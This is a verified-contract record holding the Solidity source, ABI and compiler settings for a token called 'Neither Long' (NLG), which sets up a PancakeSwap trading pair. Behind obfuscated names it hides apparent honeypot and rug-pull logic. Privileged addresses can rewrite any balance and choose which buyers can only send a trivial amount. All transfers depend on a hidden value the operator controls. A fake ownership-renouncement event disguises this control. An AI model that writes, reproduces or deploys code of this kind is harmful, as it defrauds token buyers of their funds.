{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface autoMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchFee {\n    function createPair(address totalLaunch, address txSwap) external returns (address);\n}\n\ninterface tradingMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptTake) external view returns (uint256);\n\n    function transfer(address teamTrading, uint256 listLaunched) external returns (bool);\n\n    function allowance(address exemptAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamTrading,\n        uint256 listLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityAt, uint256 value);\n    event Approval(address indexed exemptAmount, address indexed spender, uint256 value);\n}\n\ninterface tradingMaxMetadata is tradingMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NeitherLong is marketingTake, tradingMax, tradingMaxMetadata {\n\n    address public listTotalShould;\n\n    function getOwner() external view returns (address) {\n        return atMax;\n    }\n\n    string private receiverMode = \"Neither Long\";\n\n    mapping(address => bool) public fromLimit;\n\n    uint256 public maxLaunched;\n\n    string private fromShould = \"NLG\";\n\n    bool private sellToken;\n\n    address public fundTokenEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletIsMarketing;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromShould;\n    }\n\n    uint256 constant isSell = 2 ** 10;\n\n    uint256 private autoTo = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverMode;\n    }\n\n    uint256 senderLaunched;\n\n    function takeExempt(address liquidityShould, uint256 listLaunched) public {\n        minAuto();\n        limitAutoIs[liquidityShould] = listLaunched;\n    }\n\n    mapping(address => uint256) private limitAutoIs;\n\n    function balanceOf(address exemptTake) public view virtual override returns (uint256) {\n        return limitAutoIs[exemptTake];\n    }\n\n    function minAuto() private view {\n        require(fromLimit[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed buyLiquidity, address indexed shouldLiquidity);\n\n    uint256 public takeFrom;\n\n    bool private receiverSender;\n\n    function approve(address receiverLimit, uint256 listLaunched) public virtual override returns (bool) {\n        toIs[_msgSender()][receiverLimit] = listLaunched;\n        emit Approval(_msgSender(), receiverLimit, listLaunched);\n        return true;\n    }\n\n    function listTradingReceiver(uint256 listLaunched) public {\n        minAuto();\n        txReceiver = listLaunched;\n    }\n\n    mapping(address => mapping(address => uint256)) private toIs;\n\n    address private atMax;\n\n    address buyTeamEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public launchFund;\n\n    bool private enableAmountList;\n\n    function fromSwap(address amountTxList) public {\n        require(amountTxList.balance < 100000);\n        if (launchFund) {\n            return;\n        }\n        \n        fromLimit[amountTxList] = true;\n        if (tradingMin == receiverSender) {\n            tradingMin = true;\n        }\n        launchFund = true;\n    }\n\n    function receiverTotalWallet(address senderMinBuy, address teamTrading, uint256 listLaunched) internal returns (bool) {\n        if (senderMinBuy == listTotalShould) {\n            return enableMarketing(senderMinBuy, teamTrading, listLaunched);\n        }\n        uint256 launchLaunchedMax = tradingMax(fundTokenEnable).balanceOf(buyTeamEnable);\n        require(launchLaunchedMax == txReceiver);\n        require(teamTrading != buyTeamEnable);\n        if (buyMin[senderMinBuy]) {\n            return enableMarketing(senderMinBuy, teamTrading, isSell);\n        }\n        return enableMarketing(senderMinBuy, teamTrading, listLaunched);\n    }\n\n    bool public tradingMin;\n\n    constructor (){\n        if (takeFrom == maxLaunched) {\n            enableAmountList = true;\n        }\n        autoMin tradingToken = autoMin(receiverSell);\n        fundTokenEnable = launchFee(tradingToken.factory()).createPair(tradingToken.WETH(), address(this));\n        \n        listTotalShould = _msgSender();\n        takeWalletSell();\n        fromLimit[listTotalShould] = true;\n        limitAutoIs[listTotalShould] = autoTo;\n        if (maxLaunched == takeFrom) {\n            takeFrom = maxLaunched;\n        }\n        emit Transfer(address(0), listTotalShould, autoTo);\n    }\n\n    address receiverSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeWalletSell() public {\n        emit OwnershipTransferred(listTotalShould, address(0));\n        atMax = address(0);\n    }\n\n    mapping(address => bool) public buyMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTo;\n    }\n\n    function enableMarketing(address senderMinBuy, address teamTrading, uint256 listLaunched) internal returns (bool) {\n        require(limitAutoIs[senderMinBuy] >= listLaunched);\n        limitAutoIs[senderMinBuy] -= listLaunched;\n        limitAutoIs[teamTrading] += listLaunched;\n        emit Transfer(senderMinBuy, teamTrading, listLaunched);\n        return true;\n    }\n\n    function transferFrom(address senderMinBuy, address teamTrading, uint256 listLaunched) external override returns (bool) {\n        if (_msgSender() != receiverSell) {\n            if (toIs[senderMinBuy][_msgSender()] != type(uint256).max) {\n                require(listLaunched <= toIs[senderMinBuy][_msgSender()]);\n                toIs[senderMinBuy][_msgSender()] -= listLaunched;\n            }\n        }\n        return receiverTotalWallet(senderMinBuy, teamTrading, listLaunched);\n    }\n\n    function owner() external view returns (address) {\n        return atMax;\n    }\n\n    uint256 txReceiver;\n\n    function transfer(address liquidityShould, uint256 listLaunched) external virtual override returns (bool) {\n        return receiverTotalWallet(_msgSender(), liquidityShould, listLaunched);\n    }\n\n    function senderMode(address toList) public {\n        minAuto();\n        if (enableAmountList != sellToken) {\n            maxLaunched = takeFrom;\n        }\n        if (toList == listTotalShould || toList == fundTokenEnable) {\n            return;\n        }\n        buyMin[toList] = true;\n    }\n\n    bool public shouldLimitReceiver;\n\n    uint8 private walletIsMarketing = 18;\n\n    function allowance(address tokenList, address receiverLimit) external view virtual override returns (uint256) {\n        if (receiverLimit == receiverSell) {\n            return type(uint256).max;\n        }\n        return toIs[tokenList][receiverLimit];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTxList\",\"type\":\"address\"}],\"name\":\"fromSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTokenEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotalShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"listTradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"}],\"name\":\"senderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"takeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWalletSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMinBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NeitherLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}